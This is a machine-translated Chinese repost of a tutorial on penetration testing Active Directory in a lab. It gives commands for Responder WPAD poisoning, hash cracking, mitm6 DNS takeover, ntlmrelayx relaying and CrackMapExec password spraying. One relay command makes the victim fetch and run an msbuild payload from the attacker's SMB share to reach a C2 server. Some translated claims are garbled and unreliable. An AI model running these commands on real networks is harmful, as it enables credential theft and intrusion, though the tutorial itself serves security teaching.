<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤷🏾 🚴🏻 🐛 Pentest活动目录。 第一部分 🤚🏿 🕸️ 🦄</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="本文的翻译是专门为Pentest的学生准备的。 渗透测试实践 。 ” 



 我有几位客户在渗透测试前来找我，因为他们的状态良好，因为他们的漏洞分析没有显示出严重的漏洞，并且准备接受渗透测试，只是为了让我获得域管理员的权利，我确信他们的状况良好在15分钟内，仅利用AD中的配置错误。 

 我在渗透...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Pentest活动目录。 第一部分</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/481348/">  <i>本文的翻译是专门为<a href="https://otus.pw/QXrl/">Pentest的</a>学生准备<a href="https://otus.pw/QXrl/">的。</a></i>  <i><a href="https://otus.pw/QXrl/">渗透测试实践</a> 。 <a href="https://otus.pw/QXrl/">”</a></i> <br><hr><br><img src="https://habrastorage.org/webt/p6/3r/kw/p63rkwok1ndkvwwmwfgwiekna6w.png"><br><br> 我有几位客户在渗透测试前来找我，因为他们的状态良好，因为他们的漏洞分析没有显示出严重的漏洞，并且准备接受渗透测试，只是为了让我获得域管理员的权利，我确信他们的状况良好在15分钟内，仅利用AD中的配置错误。 <br><a name="habracut"></a><br> 我在渗透测试中看到的教育方面的差距之一是，对Active Directory渗透测试（AD）缺乏了解。 不幸的是，OSCP不会教授AD测试，甚至SANS GPEN课程也几乎不能做到这一点。 本系列文章的目的是帮助证明我过去使用AD成功进行笔试的一些技巧，工具和技术。 这绝不是每种方法或工具的详尽指南。 在整个系列中，我将使用Kali Linux 2019并通过虚拟机在虚拟域中工作。 <br><br> 让我们从定义一个<b>目标</b>开始：渗透测试的目标是确定攻击者用来侵入网络的任何可能的攻击媒介。 这<b>不仅仅是</b>获得域管理员权限然后注销。 <br><br> 现在我们有了一个目标，我们必须采取几个步骤来实现它。 以下是渗透测试周期的（粗略的）视觉指南。 <br><br><img src="https://habrastorage.org/webt/4h/xu/hi/4hxuhi10tttcfiblcafsfmdt7-e.png"><br>  <i>发言者：微软</i> <br><br>  <b>简介</b> ：一位客户已雇用您在使用Active Directory的网络上运行渗透测试。 您还没有得到任何东西。 您没有凭证，没有测试界限，没有进入前门的通行证，但是您设法通过门在背后躲藏了一个人，并找到了一个带IP电话的僻静房间。 您拔下IP电话，插入笔记本电脑，然后上网。 接下来是什么？  <b>实施</b> 。 <br><br><h3> 第一阶段 实作 </h3><br> 没有凭证，我们只能进行有限的侦察，侦察几乎会在周期的每个阶段进行，但是我们可以立即做几件事以在网络中立足。 首先，由于我们可以访问网络，因此只需通过ifconfig或ipconfig检查我们正在使用的子网。 收到IP地址后，在nmap中发出ping命令以查看其他设备是否可用。 <br><br><pre><code class="plaintext hljs">nmap -sn 192.168.1.1/24</code> </pre> <br> 如果设备退货，则说明您在做生意。 如果您什么都没收到，则可能禁用了ICMP，网络上没有其他设备，或者由于您尚未通过身份验证，因此无法与其他设备通信，并且可能已被身份安全解决方案（例如Cisco ISE）阻止。 为了本文的方便，我们假设有几台机器返回并且可以成功ping它们。 <br><br><hr><br>  <i><b>工具</b></i> ： <a href="https://github.com/SpiderLabs/Responder">响应者</a> <br><br> 接下来，我们将使用一个名为<b>Responder</b>的工具，或者，如果您对Windows <b>没什么不同</b> ，则使用<b>Inveigh</b> 。 这两个工具检查AD配置中是否存在非常常见的错误，从而导致中毒WPAD和NBT-NS。 默认情况下，Windows配置为通过自动Web代理发现（WPAD）搜索自动代理配置文件（PAC）。 重要的是要注意，WPAD不是执行搜索的协议，而只是一组允许设备查找PAC文件的过程。 自动检测PAC文件对组织很有用，因为设备将发送广播请求代理文件并接收它。 但是，当然，它不会对谁发送代理文件进行身份验证，从而使攻击者能够发送伪造的响应，然后再请求提供凭据。 <br><br> 在Kali中，默认情况下安装了响应器。 <br><br><pre> <code class="plaintext hljs">responder -I eth0 --wpad</code> </pre> <br> 在Windows 7计算机上，我打开Internet Explorer并转到Google，然后开始搜索WPAD文件。 在响应者中，我看到请求如何到达，然后响应者自动响应请求，结果是受害者发送了他的用户名和哈希密码（采用NTLMv2格式）。 <br><br><img src="https://habrastorage.org/webt/4g/fo/wr/4gfowr6lflqcpzh1-cwcbs75vlo.png"><br><br> 我们可以使用此哈希执行几项操作。 我们可以尝试使用<code>ntlmrelay.py</code>类的工具对其进行破解或中继。 我在<a href="https://hausec.com/2017/10/25/automating-the-pentesting-process-how-llmnr-spoofing-can-lead-to-domain-admin-in-5-minutes/">本文中</a>讨论了如何转换ntlm哈希，因此我将继续对其进行破解，因为通常这正是我在实践中所做的。 <br><br> 老实说，我很少在Linux / Kali上破解密码。 我使用的是nvidia GPU，该GPU从未在Kali上正确安装，而且Windows上有一个HashcatGUI，这使处理过程变得容易得多，这就是我将要使用的。 我将得到的哈希值放入一个名为<i>“ hash.txt”</i>的文件中，并在其上运行多个单词列表/规则。 但是在这种情况下，我只运行了<code>rockyou.txt</code> ，它被黑了一秒钟。 <br><br><img src="https://habrastorage.org/webt/mw/4x/ne/mw4xneie6ludbspzquxvhsuwjq8.png"><br>  <i>我对HashcatGUI的设置。</i> <br><br><img src="https://habrastorage.org/webt/km/ca/ze/kmcazexh-eid8rksx8uoybd5yye.png"><br>  <i>密码被盗-“密码！”</i> <br><br> 既然我们已经成功破解了密码，我们将获得凭据“ Alice：Password”！ <br><br> 在继续之前，我想展示其他几种方法，以防响应者无法正常工作。 <br><br><hr><br>  <i><b>工具</b></i> ： <a href="https://github.com/fox-it/mitm6">mitm6</a> <br><br> 假设客户端网络使用了合法的PAC文件，并且您的欺骗行为无效。 还有另一种使用IPv6和DNS将凭据传递到目标的方法。 默认情况下，IPv6是启用的，实际上比IPv4更可取。 这意味着，如果计算机具有IPv6 DNS服务器，它将<i>首选</i> IPv4。 同样，默认情况下，Windows计算机会通过DHCPv6请求查找IPv6 DNS服务器，这意味着，如果我们伪造IPv6 DNS服务器，我们可以有效地控制设备如何请求DNS。  <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">在此处</a>阅读有关此内容的更多信息。 <br><br>  <a href="https://github.com/fox-it/mitm6">首先</a>下载<a href="https://github.com/fox-it/mitm6">mitm6</a> 。 <br><br><pre> <code class="plaintext hljs">git clone https://github.com/fox-it/mitm6.git cd mitm6 pip install .</code> </pre> <br> 然后在目标网络工作组上运行它。 由于我们以前对网络执行ping操作，因此我们也获得了NetBIOS名称，得知目标域是<code>lab.local</code> 。 <br><br> 这是我启动<code>mitm6</code>之前目标IP设置的<code>mitm6</code> <br><br><img src="https://habrastorage.org/webt/3d/vv/vr/3dvvvrilsufnvgatvst4bwmmkgc.png"><br>  <i>注意一台DNS服务器</i> <br> 然后我启动了mitm6 <br><br><pre> <code class="plaintext hljs">mitm6 -d lab.local</code> </pre> <br><img src="https://habrastorage.org/webt/bc/sl/qm/bcslqmbg7zlncefnc-1xukg55rk.png"><br><br> 现在，DNS服务器的目标已更改 <br><br><img src="https://habrastorage.org/webt/qm/qe/ko/qmqekoijtpdxp4d57ro02p3kr1u.png"><br>  <i>记下IPv6地址作为DNS服务器。</i> <i><br></i> <br> 现在真正的漏洞是Windows更喜欢IPv6，而不是IPv4，也就是说，我现在控制DNS。 <br><br> 因此，现在我们使用这样的事实：我们通过通过<code>ntlmrelayx.py</code>欺骗WPAD响应来控制DNS。 我写了有关如何安装它的<a href="https://hausec.com/how-to-set-up-ntlmrelayx-py/">指南</a> 。 <br><br> 在一个窗口中运行<code>ntlmrelayx.py</code> ，打开另一个窗口并运行<code>ntlmrelayx.py</code> <br><br><pre> <code class="plaintext hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i</code> </pre> <br>  <i><code>-wh</code> ：托管WPAD文件的服务器（攻击者IP）</i> <i><br></i>  <i><code>-t</code> ：目标（您不能将凭据转发到制造中的同一设备）</i> <i><br></i>  <i><code>-i</code> ：打开交互式外壳</i> <br><br><img src="https://habrastorage.org/webt/8p/wh/cu/8pwhcuwgx_6wyskxawrr5cq8db0.png"><br><br> 从这里，您可以连接到您选择的控制和监视系统（C2）。 在这种情况下，我使用SILENTTRINITY，所以我使用-c命令执行我的命令，在这种情况下，该命令使用MSBuild创建我的恶意有效负载。 <br><br><pre> <code class="xml hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.50/ --no-smb-server -c 'C:\Windows\Microsoft.NET\Framework64\v3.5\msbuild.exe \\192.168.218.129\SMB\msbuild.xml'</code> </pre> <br><img src="https://habrastorage.org/webt/mz/wg/la/mzwglak5n0kzty0vgqy4z7g5kya.png"><br><br> 但是，不，在这种情况下， <code>msbuild.exe</code>不会创建XML文件，而且我也无法与SILENTTRINITY建立连接，因为那太简单了。 相反，我看着我的SMB服务器，看到中继哈希 <br><br><img src="https://habrastorage.org/webt/b_/vf/qk/b_vfqka5be-1bek_90jncfywhge.png"><br><br> 反过来，我又黑了。 <br><br><img src="https://habrastorage.org/webt/s3/e5/qa/s3e5qaojtbishyvggzxt52orsdy.png"><br><br> 现在，我们无需使用响应程序即可获得网络凭据。 <br><br><hr><br>  <i><b>工具</b></i> ： <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> <br><br>  <b>CrackMapExec</b>本质上是瑞士的五星刀。 从密码喷雾攻击和哈希传输到执行命令，对于渗透测试者来说，它应该存在于每套工具中。 <br><br> 如果其他所有方法均失败，我们可以尝试使用密码喷雾攻击。 为什么使用此方法是最后一个原因，这是由于密码锁定。 密码阻止并不像您想象的那么普遍，这使攻击者可以通过用户名使用字典攻击。 获取用户名是可以通过OSINT和TheHarvester完成的第一步。 如果我们没有来自OSINT的用户名，我们还可以为CrackMapExec（CME）提供用户名列表，但是为了<b>节省</b>时间，我们假设我们有一个<b>rsmith用户名</b> 。 <br><br> 如果您使用的是Kali，则应该已经安装了CrackMapExec；如果使用的是较新的版本，则可以安装该软件；如果没有，则可以安装 <br><br><pre> <code class="plaintext hljs">apt-get install crackmapexec</code> </pre> <br> 由于扫描的结果是我们在网络上找到了该设备，因此我们可以为CME提供密码列表和用户名，然后尝试登录到系统。 <br><br><pre> <code class="plaintext hljs">crackmapexec smb 192.168.218.40 -d lab.local -u rsmith -p ~/Documents/wordlists/fasttrack.txt --shares</code> </pre> <br> 几秒钟后，找到密码。 <br><br><img src="https://habrastorage.org/webt/uo/b7/ed/uob7edro_ir8xggvgxezdcqjjek.png"><br><br> 找到凭据！ <br><br> 它看起来似乎太CTF了，但是season：year是一个非常流行的密码组合。 <br><br> 获得这些凭据后，我们现在有了一个用户帐户。 在<a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">第二部分</a>中，我们将继续进行特权升级。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN481348/">https://habr.com/ru/post/zh-CN481348/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN481338/index.html">利用xss漏洞</a></li>
<li><a href="../zh-CN481340/index.html">7天的时间里，有15名工程师和600台服务器：Yandex.Money移至新的数据中心</a></li>
<li><a href="../zh-CN481342/index.html">星期五民意调查：谈论语言</a></li>
<li><a href="../zh-CN481344/index.html">IntelliJ平台团队2020年计划</a></li>
<li><a href="../zh-CN481346/index.html">汽车行业的5大变化</a></li>
<li><a href="../zh-CN481350/index.html">谁在普列塞茨克国际机场工作</a></li>
<li><a href="../zh-CN481352/index.html">DBA：从没有PK的表中清除克隆记录</a></li>
<li><a href="../zh-CN481354/index.html">TelegramBot。 基本功能。 分开飞，肉饼分开。 （第二部分）</a></li>
<li><a href="../zh-CN481356/index.html">谢谢，2019</a></li>
<li><a href="../zh-CN481358/index.html">C ++俄罗斯：过去的样子</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>